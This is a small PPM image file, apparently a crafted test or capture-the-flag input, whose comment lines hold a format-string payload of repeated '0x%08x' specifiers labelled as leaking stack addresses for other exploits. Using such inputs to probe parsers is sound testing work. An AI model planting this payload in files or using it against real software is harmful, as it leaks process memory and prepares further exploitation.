P3
2 3 
255
# Finding memory addresses of the stack for other exploits
# 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x -
# 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x -
# 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x -
# 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x -
# 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x - 0x%08x -
255   0   0     0 255   0     0   0 255
255 255   0   255 255 255     0   0   0